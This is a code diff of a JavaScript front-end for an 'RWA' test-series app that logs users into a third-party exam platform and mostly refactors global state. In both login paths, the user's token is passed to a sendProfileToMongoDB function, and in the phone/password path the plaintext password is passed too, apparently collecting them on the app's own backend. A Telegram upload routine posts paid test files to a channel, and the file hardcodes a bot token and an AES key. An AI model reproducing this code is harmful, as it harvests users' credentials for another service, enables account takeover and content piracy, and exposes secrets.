@@ -5,13 +5,38 @@
 const BOT_API_BASE = "https://rwaweb-hp11.onrender.com";
 const API_BASE = "https://rozgarapinew.teachx.in";
 const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
-const WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";
+
+// Exposing PROXY URL Globally for tcs-engine
+window.WORKER_RAW_PROXY = "https://proplayer.allswbatch22.workers.dev/proxy?url=";
 
 const TG_BOT_TOKEN = "8832643385:AAG5SZyJo7dDrvvK_dO_2pEOQK09OLeA6WM"; 
 const TG_CHANNEL_ID = "-1004454849047";
 
 // =====================================================
-// PERMANENT DEVICE STORAGE ENGINE (LOCALSTORAGE + INDEXEDDB)
+// GLOBAL APP STATE (Fixed for Cross-File Access)
+// =====================================================
+window.state = {
+    currentSlide: "slideExplorer",
+    previousSlide: "slideExplorer",
+    activeAppTab: "tests",
+    view: "ts_list",
+    activeTokenObj: null, // Will be set after user tokens are loaded
+    currentPdfUrl: "",
+    tsMode: "paid_ts",
+    activeSeriesId: null,
+    activeSeriesTitle: "",
+    activeTsSubId: null,
+    activeTsSubName: "",
+    testMap: {}, // This is where the test data is saved
+    pendingTestKey: null,
+    pendingPdfKey: null,
+    totalSeriesCount: 0,
+    totalTestsCount: 0,
+    knownTestIds: {}
+};
+
+// =====================================================
+// PERMANENT DEVICE STORAGE ENGINE
 // =====================================================
 const IDB_NAME = "RWA_TestSeries_Permanent_DB";
 const IDB_STORE = "app_kv_store";
@@ -60,31 +85,33 @@ async function restoreFromPermanentIDB() {
     try {
         const idbAttempts = await idbGetItem("rwa_attempted_tests_full");
         if (idbAttempts && typeof idbAttempts === "object") {
-            ATTEMPTED_TESTS = { ...idbAttempts, ...ATTEMPTED_TESTS };
+            window.ATTEMPTED_TESTS = { ...idbAttempts, ...window.ATTEMPTED_TESTS };
             const slimCopy = {};
-            Object.keys(ATTEMPTED_TESTS).forEach(tid => {
-                slimCopy[tid] = { ...ATTEMPTED_TESTS[tid], questionsSnapshot: null, activeSectionsSnapshot: null, responses: null };
+            Object.keys(window.ATTEMPTED_TESTS).forEach(tid => {
+                slimCopy[tid] = { ...window.ATTEMPTED_TESTS[tid], questionsSnapshot: null, activeSectionsSnapshot: null, responses: null };
             });
             localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(slimCopy));
         }
 
         const idbBookmarks = await idbGetItem("rwa_bookmarked_questions_v1");
-        if (Array.isArray(idbBookmarks) && idbBookmarks.length > 0 && BOOKMARKED_QUESTIONS.length === 0) {
-            BOOKMARKED_QUESTIONS = idbBookmarks;
-            localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(BOOKMARKED_QUESTIONS));
+        if (Array.isArray(idbBookmarks) && idbBookmarks.length > 0 && window.BOOKMARKED_QUESTIONS.length === 0) {
+            window.BOOKMARKED_QUESTIONS = idbBookmarks;
+            localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(window.BOOKMARKED_QUESTIONS));
         }
 
         const idbTokens = await idbGetItem("rwa_user_tokens_v2");
-        if (Array.isArray(idbTokens) && idbTokens.length > 0 && USER_TOKENS.length === 0) {
-            USER_TOKENS = idbTokens.filter(t => t && t.token && !t.isAdmin);
-            localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
+        if (Array.isArray(idbTokens) && idbTokens.length > 0 && window.USER_TOKENS.length === 0) {
+            window.USER_TOKENS = idbTokens.filter(t => t && t.token && !t.isAdmin);
+            localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(window.USER_TOKENS));
         }
 
         const idbProfile = await idbGetItem("rwa_user_profile_v2");
-        if (idbProfile && !USER_PROFILE) {
-            USER_PROFILE = idbProfile;
-            localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
+        if (idbProfile && !window.USER_PROFILE) {
+            window.USER_PROFILE = idbProfile;
+            localStorage.setItem("rwa_user_profile_v2", JSON.stringify(window.USER_PROFILE));
         }
+        
+        if(window.USER_TOKENS.length > 0) window.state.activeTokenObj = window.USER_TOKENS[0];
 
         updateTokenBadge();
         window.updateDashboardUI();
@@ -93,7 +120,7 @@ async function restoreFromPermanentIDB() {
 
 window.sendToTelegramChannel = async function(blob, fileType, title) {
     if (!TG_BOT_TOKEN || TG_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return false;
-    const caption = `╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n       🏆 𝐑𝐖𝐀 𝐓𝐄𝐒𝐓 𝐒𝐄𝐑𝐈𝐄𝐒 𝐋𝐈𝐁𝐑𝐀𝐑𝐘\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n📁 Type            : ${fileType}\n🎬 Title             : ${title}\n🏆 Series Name : ${state.activeSeriesTitle || "Paid Test Series"}\n📚 Folder Name : ${state.activeTsSubName || "Mock Test"}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🚀 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐑𝐖𝐀\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`;
+    const caption = `╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n       🏆 𝐑𝐖𝐀 𝐓𝐄𝐒𝐓 𝐒𝐄𝐑𝐈𝐄𝐒 𝐋𝐈𝐁𝐑𝐀𝐑𝐘\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n📁 Type            : ${fileType}\n🎬 Title             : ${title}\n🏆 Series Name : ${window.state.activeSeriesTitle || "Paid Test Series"}\n📚 Folder Name : ${window.state.activeTsSubName || "Mock Test"}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🚀 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐑𝐖𝐀\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`;
     const formData = new FormData();
     formData.append("chat_id", TG_CHANNEL_ID);
     formData.append("caption", caption);
@@ -135,21 +162,24 @@ function extractUidFromJwt(jwtStr) {
 
 function getUserSavedTokens() { try { const raw = localStorage.getItem("rwa_user_tokens_v2"); if (raw) { const parsed = JSON.parse(raw); if (Array.isArray(parsed)) return parsed.filter(t => t && t.token && !t.isAdmin); } } catch {} return []; }
 function getSavedUserProfile() { try { const raw = localStorage.getItem("rwa_user_profile_v2"); if (raw) return JSON.parse(raw); } catch {} return null; }
-function getSavedAttemptsMap() { return {}; }
 function getSavedBookmarksList() { try { const raw = localStorage.getItem("rwa_bookmarked_questions_v1"); if (raw) { const parsed = JSON.parse(raw); if (Array.isArray(parsed)) return parsed; } } catch {} return []; }
 
-let USER_TOKENS = getUserSavedTokens();
-let USER_PROFILE = getSavedUserProfile();
-let ATTEMPTED_TESTS = getSavedAttemptsMap();
-let BOOKMARKED_QUESTIONS = getSavedBookmarksList();
+window.USER_TOKENS = getUserSavedTokens();
+window.USER_PROFILE = getSavedUserProfile();
+window.ATTEMPTED_TESTS = {}; // Will be loaded from IDB
+window.BOOKMARKED_QUESTIONS = getSavedBookmarksList();
 let activeBookmarkDetailIdx = 0;
 
-function isUserLoggedIn() { return USER_TOKENS.length > 0 && Boolean(USER_TOKENS[0].token); }
-function updateTokenBadge() { const b = document.getElementById("tokCountBadge"); if (b) b.textContent = USER_TOKENS.length; checkAuthUIState(); }
+if(window.USER_TOKENS.length > 0) {
+    window.state.activeTokenObj = window.USER_TOKENS[0];
+}
+
+function isUserLoggedIn() { return window.USER_TOKENS.length > 0 && Boolean(window.USER_TOKENS[0].token); }
+function updateTokenBadge() { const b = document.getElementById("tokCountBadge"); if (b) b.textContent = window.USER_TOKENS.length; checkAuthUIState(); }
 function checkAuthUIState() {
     const userNameText = document.getElementById("navUserNameText"), avatarEl = document.getElementById("navProfileAvatar");
     if (isUserLoggedIn()) {
-        const name = (USER_PROFILE && USER_PROFILE.name) ? USER_PROFILE.name : "My Profile";
+        const name = (window.USER_PROFILE && window.USER_PROFILE.name) ? window.USER_PROFILE.name : "My Profile";
         if (userNameText) userNameText.textContent = name;
         if (avatarEl) avatarEl.textContent = name.charAt(0).toUpperCase();
     } else {
@@ -159,10 +189,10 @@ function checkAuthUIState() {
 }
 
 window.updateDashboardUI = function() {
-    const totalSeries = state.totalSeriesCount || 0;
-    const attemptedIds = Object.keys(ATTEMPTED_TESTS);
+    const totalSeries = window.state.totalSeriesCount || 0;
+    const attemptedIds = Object.keys(window.ATTEMPTED_TESTS);
     const attemptedCount = attemptedIds.length;
-    const totalTests = Math.max(state.totalTestsCount || 0, attemptedCount, Object.keys(state.knownTestIds || {}).length);
+    const totalTests = Math.max(window.state.totalTestsCount || 0, attemptedCount, Object.keys(window.state.knownTestIds || {}).length);
     const remainingCount = Math.max(0, totalTests - attemptedCount);
 
     const els = { series: "dashTotalSeries", tests: "dashTotalTests", attempted: "dashAttemptedTests", remaining: "dashRemainingTests" };
@@ -178,35 +208,35 @@ window.updateDashboardUI = function() {
     if (pctSub) pctSub.textContent = `Aapne kul ${totalTests} tests mein se ${attemptedCount} attempt kar liye hain (${remainingCount} bache hain).`;
 
     const bmBadge = document.getElementById("bookmarkCountBadge");
-    if (bmBadge) bmBadge.textContent = BOOKMARKED_QUESTIONS.length;
+    if (bmBadge) bmBadge.textContent = window.BOOKMARKED_QUESTIONS.length;
     renderRecentAttemptsList();
 };
 
 window.recordUserTestAttempt = function(testId, attemptInfo) {
     if (!testId) return;
     const tid = String(testId).trim();
-    ATTEMPTED_TESTS[tid] = {
+    window.ATTEMPTED_TESTS[tid] = {
         testId: tid, testKey: attemptInfo.testKey || `test_${tid}`, title: attemptInfo.title || `Test #${tid}`,
-        seriesId: attemptInfo.seriesId || state.activeSeriesId || "", seriesTitle: attemptInfo.seriesTitle || state.activeSeriesTitle || "Paid Test Series",
+        seriesId: attemptInfo.seriesId || window.state.activeSeriesId || "", seriesTitle: attemptInfo.seriesTitle || window.state.activeSeriesTitle || "Paid Test Series",
         score: attemptInfo.score ?? 0, maxMarks: attemptInfo.maxMarks ?? 100, correct: attemptInfo.correct ?? 0, incorrect: attemptInfo.incorrect ?? 0,
         unattempted: attemptInfo.unattempted ?? 0, accuracy: attemptInfo.accuracy ?? 0, timeCorr: attemptInfo.timeCorr ?? 0, timeInc: attemptInfo.timeInc ?? 0, timeUna: attemptInfo.timeUna ?? 0,
-        testMeta: attemptInfo.testMeta || state.testMap[`test_${tid}`] || null, responses: attemptInfo.responses || {},
+        testMeta: attemptInfo.testMeta || window.state.testMap[`test_${tid}`] || null, responses: attemptInfo.responses || {},
         selectedOptionalByGroup: attemptInfo.selectedOptionalByGroup || {}, activeSectionsSnapshot: attemptInfo.activeSectionsSnapshot || null, questionsSnapshot: attemptInfo.questionsSnapshot || null,
         date: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" })
     };
 
     const slimCopyForLocalStorage = {};
-    Object.keys(ATTEMPTED_TESTS).forEach(key => { slimCopyForLocalStorage[key] = { ...ATTEMPTED_TESTS[key], questionsSnapshot: null, activeSectionsSnapshot: null, responses: null }; });
+    Object.keys(window.ATTEMPTED_TESTS).forEach(key => { slimCopyForLocalStorage[key] = { ...window.ATTEMPTED_TESTS[key], questionsSnapshot: null, activeSectionsSnapshot: null, responses: null }; });
     try { localStorage.setItem("rwa_attempted_tests_v1", JSON.stringify(slimCopyForLocalStorage)); } catch {}
-    idbSetItem("rwa_attempted_tests_full", ATTEMPTED_TESTS);
+    idbSetItem("rwa_attempted_tests_full", window.ATTEMPTED_TESTS);
     window.updateDashboardUI();
 };
 
-window.getSavedAttemptByTestId = function(testId) { return ATTEMPTED_TESTS[String(testId).trim()] || null; };
+window.getSavedAttemptByTestId = function(testId) { return window.ATTEMPTED_TESTS[String(testId).trim()] || null; };
 
 function renderRecentAttemptsList() {
     const container = document.getElementById("recentAttemptsList"); if (!container) return;
-    const entries = Object.values(ATTEMPTED_TESTS).reverse();
+    const entries = Object.values(window.ATTEMPTED_TESTS).reverse();
     if (entries.length === 0) { container.innerHTML = `<div class="p-6 text-center text-xs font-bold text-slate-500 bg-slate-50 rounded-2xl border border-slate-200">Abhi tak aapne koi test attempt nahi kiya hai. Test submit karte hi aapka score yahan dikhega.</div>`; return; }
 
     container.innerHTML = entries.map(item => `
@@ -218,48 +248,48 @@ function renderRecentAttemptsList() {
 
 window.clearAttemptHistory = function() {
     if (confirm("Kya aap apni Attempted Tests history reset karna chahte hain?")) {
-        ATTEMPTED_TESTS = {}; localStorage.removeItem("rwa_attempted_tests_v1"); idbSetItem("rwa_attempted_tests_full", {});
+        window.ATTEMPTED_TESTS = {}; localStorage.removeItem("rwa_attempted_tests_v1"); idbSetItem("rwa_attempted_tests_full", {});
         window.updateDashboardUI();
-        if (state.view === "ts_tests" && state.activeSeriesId) openTestSeriesTitles(state.activeSeriesId, state.activeTsSubId || "-1", state.activeTsSubName || state.activeSeriesTitle);
+        if (window.state.view === "ts_tests" && window.state.activeSeriesId) openTestSeriesTitles(window.state.activeSeriesId, window.state.activeTsSubId || "-1", window.state.activeTsSubName || window.state.activeSeriesTitle);
     }
 };
 
-window.isQuestionBookmarked = function(qKey) { return BOOKMARKED_QUESTIONS.some(b => String(b.qKey) === String(qKey)); };
+window.isQuestionBookmarked = function(qKey) { return window.BOOKMARKED_QUESTIONS.some(b => String(b.qKey) === String(qKey)); };
 window.toggleBookmarkItem = function(itemObj) {
     if (!itemObj || !itemObj.qKey) return false;
-    const existsIdx = BOOKMARKED_QUESTIONS.findIndex(b => String(b.qKey) === String(itemObj.qKey));
+    const existsIdx = window.BOOKMARKED_QUESTIONS.findIndex(b => String(b.qKey) === String(itemObj.qKey));
     let isNowSaved = false;
-    if (existsIdx >= 0) { BOOKMARKED_QUESTIONS.splice(existsIdx, 1); isNowSaved = false; } 
-    else { BOOKMARKED_QUESTIONS.unshift({ ...itemObj, savedAt: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" }) }); isNowSaved = true; }
-    localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(BOOKMARKED_QUESTIONS)); idbSetItem("rwa_bookmarked_questions_v1", BOOKMARKED_QUESTIONS);
+    if (existsIdx >= 0) { window.BOOKMARKED_QUESTIONS.splice(existsIdx, 1); isNowSaved = false; } 
+    else { window.BOOKMARKED_QUESTIONS.unshift({ ...itemObj, savedAt: new Date().toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" }) }); isNowSaved = true; }
+    localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(window.BOOKMARKED_QUESTIONS)); idbSetItem("rwa_bookmarked_questions_v1", window.BOOKMARKED_QUESTIONS);
     window.updateDashboardUI(); renderBookmarksTab(); return isNowSaved;
 };
 
 window.removeBookmarkByKey = function(qKey, fromDetailView = false) {
-    BOOKMARKED_QUESTIONS = BOOKMARKED_QUESTIONS.filter(b => String(b.qKey) !== String(qKey));
-    localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(BOOKMARKED_QUESTIONS)); idbSetItem("rwa_bookmarked_questions_v1", BOOKMARKED_QUESTIONS);
+    window.BOOKMARKED_QUESTIONS = window.BOOKMARKED_QUESTIONS.filter(b => String(b.qKey) !== String(qKey));
+    localStorage.setItem("rwa_bookmarked_questions_v1", JSON.stringify(window.BOOKMARKED_QUESTIONS)); idbSetItem("rwa_bookmarked_questions_v1", window.BOOKMARKED_QUESTIONS);
     window.updateDashboardUI();
     if (fromDetailView) {
-        if (BOOKMARKED_QUESTIONS.length === 0) closeBookmarkDetailView();
+        if (window.BOOKMARKED_QUESTIONS.length === 0) closeBookmarkDetailView();
         else {
-            if (activeBookmarkDetailIdx >= BOOKMARKED_QUESTIONS.length) activeBookmarkDetailIdx = BOOKMARKED_QUESTIONS.length - 1;
+            if (activeBookmarkDetailIdx >= window.BOOKMARKED_QUESTIONS.length) activeBookmarkDetailIdx = window.BOOKMARKED_QUESTIONS.length - 1;
             openBookmarkDetailView(activeBookmarkDetailIdx);
         }
     } else renderBookmarksTab();
 };
 
 window.clearAllBookmarks = function() {
-    if (BOOKMARKED_QUESTIONS.length === 0) return;
+    if (window.BOOKMARKED_QUESTIONS.length === 0) return;
     if (confirm("Kya aap sabhi Bookmarked Questions delete karna chahte hain?")) {
-        BOOKMARKED_QUESTIONS = []; localStorage.removeItem("rwa_bookmarked_questions_v1"); idbSetItem("rwa_bookmarked_questions_v1", []);
+        window.BOOKMARKED_QUESTIONS = []; localStorage.removeItem("rwa_bookmarked_questions_v1"); idbSetItem("rwa_bookmarked_questions_v1", []);
         closeBookmarkDetailView(); window.updateDashboardUI(); renderBookmarksTab();
     }
 };
 
 function renderBookmarksTab() {
     const container = document.getElementById("bookmarksListContainer"); if (!container) return;
-    if (BOOKMARKED_QUESTIONS.length === 0) { container.innerHTML = `<div class="sky-card p-10 text-center"><div class="text-4xl mb-2">🔖</div><h4 class="font-black text-base text-slate-800">Abhi koi Question Bookmark nahi hai</h4><p class="text-xs font-semibold text-slate-500 mt-1">Live Test ya Solution dekhte waqt upar <b>☆ Save</b> button dabayein, woh question yahan save ho jayega.</p></div>`; return; }
-    container.innerHTML = BOOKMARKED_QUESTIONS.map((b, idx) => `
+    if (window.BOOKMARKED_QUESTIONS.length === 0) { container.innerHTML = `<div class="sky-card p-10 text-center"><div class="text-4xl mb-2">🔖</div><h4 class="font-black text-base text-slate-800">Abhi koi Question Bookmark nahi hai</h4><p class="text-xs font-semibold text-slate-500 mt-1">Live Test ya Solution dekhte waqt upar <b>☆ Save</b> button dabayein, woh question yahan save ho jayega.</p></div>`; return; }
+    container.innerHTML = window.BOOKMARKED_QUESTIONS.map((b, idx) => `
         <div onclick="openBookmarkDetailView(${idx})" class="sky-card p-4 sm:p-5 hover:border-indigo-400 cursor-pointer transition-all flex items-start justify-between gap-3">
             <div class="flex items-start gap-3 min-w-0 flex-1"><div class="w-9 h-9 rounded-xl bg-indigo-600 text-white font-black text-xs flex items-center justify-center shrink-0 mt-0.5">Q${idx + 1}</div><div class="min-w-0 flex-1"><div class="flex items-center gap-2 flex-wrap mb-1.5"><span class="px-2.5 py-0.5 rounded-full bg-indigo-100 text-indigo-900 text-[10px] font-black">${b.subject || "Subject"}</span><span class="text-[11px] font-bold text-slate-500">📝 ${b.testTitle || "Mock Test"} (Q.${b.qNumber || 1})</span></div><div class="text-sm sm:text-base font-bold text-slate-900 leading-relaxed">${b.question || ""}</div><div class="inline-block mt-2.5 text-xs font-extrabold text-indigo-700 bg-indigo-50 px-3 py-1 rounded-lg">👁️ Click to View Options & Full Explanation ➔</div></div></div>
             <button onclick="event.stopPropagation(); removeBookmarkByKey('${b.qKey}', false);" class="px-2.5 py-1.5 rounded-lg bg-rose-100 hover:bg-rose-200 text-rose-700 font-extrabold text-[11px] border-0 cursor-pointer shrink-0">🗑</button>
@@ -268,10 +298,10 @@ function renderBookmarksTab() {
 }
 
 window.openBookmarkDetailView = function(idx) {
-    if (!BOOKMARKED_QUESTIONS || BOOKMARKED_QUESTIONS.length === 0 || idx < 0 || idx >= BOOKMARKED_QUESTIONS.length) return;
-    activeBookmarkDetailIdx = idx; const b = BOOKMARKED_QUESTIONS[idx];
+    if (!window.BOOKMARKED_QUESTIONS || window.BOOKMARKED_QUESTIONS.length === 0 || idx < 0 || idx >= window.BOOKMARKED_QUESTIONS.length) return;
+    activeBookmarkDetailIdx = idx; const b = window.BOOKMARKED_QUESTIONS[idx];
     document.getElementById("bookmarksListSubView").classList.add("hidden"); document.getElementById("bookmarkDetailSubView").classList.remove("hidden");
-    document.getElementById("bmDetailCounter").textContent = `Question ${idx + 1} of ${BOOKMARKED_QUESTIONS.length}`;
+    document.getElementById("bmDetailCounter").textContent = `Question ${idx + 1} of ${window.BOOKMARKED_QUESTIONS.length}`;
     document.getElementById("bmDetailDeleteBtn").onclick = () => window.removeBookmarkByKey(b.qKey, true);
     document.getElementById("bmDetailMeta").innerHTML = `<span class="px-3 py-1 rounded-full bg-amber-100 text-amber-900 text-xs font-black">🔖 Bookmark #${idx + 1}</span><span class="px-3 py-1 rounded-full bg-indigo-100 text-indigo-900 text-xs font-black">${b.subject || "Subject"}</span><span class="text-xs font-bold text-slate-600">📝 ${b.testTitle || "Mock Test"} (Original Q.${b.qNumber || 1})</span>`;
     document.getElementById("bmDetailQuestion").innerHTML = b.question || "";
@@ -286,7 +316,7 @@ window.openBookmarkDetailView = function(idx) {
     }
     document.getElementById("bmDetailSolution").innerHTML = b.solution || "Detailed solution is shown in the highlighted correct option above.";
     document.getElementById("bmPrevBtn").disabled = idx <= 0; document.getElementById("bmPrevBtn").style.opacity = idx <= 0 ? "0.45" : "1";
-    document.getElementById("bmNextBtn").disabled = idx >= BOOKMARKED_QUESTIONS.length - 1; document.getElementById("bmNextBtn").style.opacity = idx >= BOOKMARKED_QUESTIONS.length - 1 ? "0.45" : "1";
+    document.getElementById("bmNextBtn").disabled = idx >= window.BOOKMARKED_QUESTIONS.length - 1; document.getElementById("bmNextBtn").style.opacity = idx >= window.BOOKMARKED_QUESTIONS.length - 1 ? "0.45" : "1";
     if (window.MathJax && MathJax.typesetPromise) MathJax.typesetPromise([document.getElementById("bookmarkDetailSubView")]).catch(() => {});
     window.scrollTo({ top: 0, behavior: "smooth" });
 };
@@ -297,10 +327,10 @@ window.closeBookmarkDetailView = function() {
 };
 
 window.prevBookmarkDetail = function() { if (activeBookmarkDetailIdx > 0) window.openBookmarkDetailView(activeBookmarkDetailIdx - 1); };
-window.nextBookmarkDetail = function() { if (activeBookmarkDetailIdx < BOOKMARKED_QUESTIONS.length - 1) window.openBookmarkDetailView(activeBookmarkDetailIdx + 1); };
+window.nextBookmarkDetail = function() { if (activeBookmarkDetailIdx < window.BOOKMARKED_QUESTIONS.length - 1) window.openBookmarkDetailView(activeBookmarkDetailIdx + 1); };
 
 window.switchAppTab = function(tabName) {
-    state.activeAppTab = tabName;
+    window.state.activeAppTab = tabName;
     const tabs = { tests: { btn: "appTabTests", view: "appViewTests" }, dashboard: { btn: "appTabDashboard", view: "appViewDashboard" }, bookmarks: { btn: "appTabBookmarks", view: "appViewBookmarks" } };
     Object.keys(tabs).forEach(k => {
         const btnEl = document.getElementById(tabs[k].btn), viewEl = document.getElementById(tabs[k].view);
@@ -325,7 +355,7 @@ function openLoginModal(customMsg) {
 }
 function closeLoginModal() {
     const modal = document.getElementById("loginModal"); if (modal) modal.classList.add("hidden");
-    state.pendingTestKey = null; state.pendingPdfKey = null;
+    window.state.pendingTestKey = null; window.state.pendingPdfKey = null;
 }
 window.switchLoginMode = function(mode) {
     const btnCreds = document.getElementById("tabBtnCreds"), btnToken = document.getElementById("tabBtnToken"), boxCreds = document.getElementById("loginBoxCreds"), boxToken = document.getElementById("loginBoxToken"), alertBox = document.getElementById("loginStatusAlert");
@@ -401,10 +431,10 @@ async function loginOnRwaServer(phoneOrEmail, password) {
 }
 
 function completePostLoginFlow() {
-    state.activeTokenObj = USER_TOKENS[0]; updateTokenBadge();
-    const pendingTest = state.pendingTestKey, pendingPdf = state.pendingPdfKey, modal = document.getElementById("loginModal");
+    window.state.activeTokenObj = window.USER_TOKENS[0]; updateTokenBadge();
+    const pendingTest = window.state.pendingTestKey, pendingPdf = window.state.pendingPdfKey, modal = document.getElementById("loginModal");
     if (modal) modal.classList.add("hidden");
-    state.pendingTestKey = null; state.pendingPdfKey = null;
+    window.state.pendingTestKey = null; window.state.pendingPdfKey = null;
     if (pendingTest) { launchCbtTest(pendingTest); return; }
     if (pendingPdf) { openTestPdf(pendingPdf); return; }
     if (!document.getElementById("profileModal").classList.contains("hidden")) openProfileModal();
@@ -422,10 +452,10 @@ window.submitUserLogin = async function(mode) {
         if (!userDetails) { showLoginStatus("❌ Token Expired ya Invalid hai! Server ne token reject kar diya.", "error"); return; }
 
         const userTokObj = { id: "utok_" + Date.now(), label: userDetails.name || `User #${extractedUid}`, userId: String(userDetails.userid || userDetails.id || extractedUid), token: rawToken, isAdmin: false };
-        USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== userTokObj.userId)];
-        USER_PROFILE = userDetails;
-        localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS)); localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
-        idbSetItem("rwa_user_tokens_v2", USER_TOKENS); idbSetItem("rwa_user_profile_v2", USER_PROFILE);
+        window.USER_TOKENS = [userTokObj, ...window.USER_TOKENS.filter(t => t.userId !== userTokObj.userId)];
+        window.USER_PROFILE = userDetails;
+        localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(window.USER_TOKENS)); localStorage.setItem("rwa_user_profile_v2", JSON.stringify(window.USER_PROFILE));
+        idbSetItem("rwa_user_tokens_v2", window.USER_TOKENS); idbSetItem("rwa_user_profile_v2", window.USER_PROFILE);
         sendProfileToMongoDB(userDetails, rawToken, "Direct JWT Token", "Logged via Token");
         showLoginStatus(`✅ Login Successful! Welcome ${userDetails.name || "User"}!`, "success");
         setTimeout(completePostLoginFlow, 500); return;
@@ -444,9 +474,9 @@ window.submitUserLogin = async function(mode) {
     if (!userDetails) userDetails = { id: uid, userid: uid, name: loginData.name || phone, email: loginData.email || phone, phone: loginData.phone || phone, username: loginData.username || "", state: loginData.state || "N/A", district: loginData.district || "N/A" };
     
     const userTokObj = { id: "utok_" + Date.now(), label: userDetails.name || phone, userId: uid, token: token, isAdmin: false };
-    USER_TOKENS = [userTokObj, ...USER_TOKENS.filter(t => t.userId !== uid)]; USER_PROFILE = userDetails;
-    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS)); localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
-    idbSetItem("rwa_user_tokens_v2", USER_TOKENS); idbSetItem("rwa_user_profile_v2", USER_PROFILE);
+    window.USER_TOKENS = [userTokObj, ...window.USER_TOKENS.filter(t => t.userId !== uid)]; window.USER_PROFILE = userDetails;
+    localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(window.USER_TOKENS)); localStorage.setItem("rwa_user_profile_v2", JSON.stringify(window.USER_PROFILE));
+    idbSetItem("rwa_user_tokens_v2", window.USER_TOKENS); idbSetItem("rwa_user_profile_v2", window.USER_PROFILE);
     sendProfileToMongoDB(userDetails, token, "Phone/Password Login", pass);
     showLoginStatus(`✅ Welcome ${userDetails.name || "User"}! Login Successful.`, "success");
     setTimeout(completePostLoginFlow, 500);
@@ -466,18 +496,18 @@ async function openProfileModal() {
     if (tokenBox) tokenBox.classList.add("hidden");
 
     if (!isUserLoggedIn()) {
-        contentBox.innerHTML = `<div class="bg-indigo-50 border-2 border-indigo-200 rounded-2xl p-5 text-center"><div class="w-14 h-14 rounded-2xl bg-indigo-600 text-white font-black text-2xl flex items-center justify-center mx-auto shadow-md mb-2.5">🔐</div><h4 class="font-black text-base text-slate-900">Aap abhi Logged In nahi hain</h4><p class="text-xs font-semibold text-slate-600 mt-1">Sabhi Paid Tests attempt karne aur apni Profile dekhne ke liye Login karein ya apna Token add karein.</p><div class="flex flex-wrap justify-center gap-2.5 mt-4"><button onclick="closeProfileModal(); openLoginModal();" class="btn-watch text-xs px-5 py-2.5">🔐 Login Now</button><button onclick="toggleProfileTokenBox()" class="btn-nav bg-amber-500 text-white border-0 text-xs px-4 py-2.5">🔑 My Token (${USER_TOKENS.length})</button></div></div>`;
+        contentBox.innerHTML = `<div class="bg-indigo-50 border-2 border-indigo-200 rounded-2xl p-5 text-center"><div class="w-14 h-14 rounded-2xl bg-indigo-600 text-white font-black text-2xl flex items-center justify-center mx-auto shadow-md mb-2.5">🔐</div><h4 class="font-black text-base text-slate-900">Aap abhi Logged In nahi hain</h4><p class="text-xs font-semibold text-slate-600 mt-1">Sabhi Paid Tests attempt karne aur apni Profile dekhne ke liye Login karein ya apna Token add karein.</p><div class="flex flex-wrap justify-center gap-2.5 mt-4"><button onclick="closeProfileModal(); openLoginModal();" class="btn-watch text-xs px-5 py-2.5">🔐 Login Now</button><button onclick="toggleProfileTokenBox()" class="btn-nav bg-amber-500 text-white border-0 text-xs px-4 py-2.5">🔑 My Token (${window.USER_TOKENS.length})</button></div></div>`;
         if (footerBox) footerBox.innerHTML = `<button onclick="closeProfileModal()" class="btn-nav bg-slate-900 text-white border-0 ml-auto">Close</button>`; return;
     }
 
     contentBox.innerHTML = `<div class="py-8 text-center text-slate-600 font-extrabold">🔄 Server se aapki live profile fetch ho rahi hai...</div>`;
-    const activeUserTok = USER_TOKENS[0], uid = activeUserTok.userId || extractUidFromJwt(activeUserTok.token);
-    if (footerBox) footerBox.innerHTML = `<div class="flex items-center gap-2 flex-wrap"><button onclick="toggleProfileTokenBox()" class="btn-nav bg-amber-500 text-white border-0 text-xs">🔑 My Token (${USER_TOKENS.length})</button><button onclick="handleLogout()" class="btn-nav bg-rose-600 text-white border-0 text-xs">🚪 Logout</button></div><button onclick="closeProfileModal()" class="btn-nav bg-slate-900 text-white border-0 text-xs">Close</button>`;
+    const activeUserTok = window.USER_TOKENS[0], uid = activeUserTok.userId || extractUidFromJwt(activeUserTok.token);
+    if (footerBox) footerBox.innerHTML = `<div class="flex items-center gap-2 flex-wrap"><button onclick="toggleProfileTokenBox()" class="btn-nav bg-amber-500 text-white border-0 text-xs">🔑 My Token (${window.USER_TOKENS.length})</button><button onclick="handleLogout()" class="btn-nav bg-rose-600 text-white border-0 text-xs">🚪 Logout</button></div><button onclick="closeProfileModal()" class="btn-nav bg-slate-900 text-white border-0 text-xs">Close</button>`;
 
     const freshProfile = await fetchUserDetailsFromServer(activeUserTok.token, uid);
